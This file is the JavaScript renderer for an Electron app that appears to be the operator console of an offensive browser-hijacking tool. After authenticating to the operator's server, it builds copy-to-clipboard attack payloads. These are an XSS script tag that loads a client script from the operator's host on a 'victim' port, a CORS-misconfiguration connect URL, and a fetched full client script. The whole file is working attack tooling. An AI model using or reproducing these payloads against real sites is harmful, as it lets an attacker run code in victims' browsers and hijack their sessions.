const { ipcRenderer } = require('electron');
const clipboard = require('electron').clipboard;
const protocol = localStorage.getItem('protocol');
const ip = localStorage.getItem('ip');
const token = localStorage.getItem('token');
const serverPort = localStorage.getItem('serverPort');

const payloadsTable = document.getElementById('payloads-table');
const tbody = payloadsTable.getElementsByTagName('tbody')[0];

document.getElementById('back-button').addEventListener('click', () => {
  window.location.href = 'index.html';
});

document.getElementById('logout-button').addEventListener('click', () => {
  localStorage.removeItem('token');
  localStorage.removeItem('ip');
  localStorage.removeItem('protocol');
  localStorage.removeItem('serverPort');
  window.location.href = 'login.html';
});

async function getVictimPort() {
  const response = await fetch(`${protocol}://${ip}:${serverPort}/victimPort`, {
    headers: { 'shve-authentication': token }
  });

  const data = await response.json();
  return data.victimPort;
}

function encodeHTML(str) {
    return str.replace(/[\u0022\u0026\u003C\u003E\u00A0-\u9999]/g, function(i) {
      return '&#'+i.charCodeAt(0)+';';
    });
}



async function copyToClipboard(payload) {
    const victimPort = await getVictimPort();
    let text = payload.content;
    if (payload.name === 'Full Script') {
      const response = await fetch(`${protocol}://${ip}:${victimPort}/client?ip=${ip}`);
      text = await response.text();
    }
    clipboard.writeText(text);
  }
  
  async function initPayloads() {
    const victimPort = await getVictimPort();
  
    const payloads = [
      { name: 'XSS', content: `<script src="${protocol}://${ip}:${victimPort}/client?ip=${ip}"></script>` },
      { name: 'CORS Misconfiguration', content: `${protocol}://${ip}:${victimPort}/connect` },
      { name: 'Full Script', content: '' },
    ];
  
    for (const payload of payloads) {
      const newRow = tbody.insertRow();
      newRow.innerHTML = `
        <td>${payload.name}</td>
        <td>${payload.name === 'Full Script' ? '' : encodeHTML(payload.content)}</td>
        <td>
          <button onclick="copyToClipboard(${encodeHTML(JSON.stringify(payload))})">Copy to clipboard</button>
        </td>
      `;
    }
  }  

initPayloads();
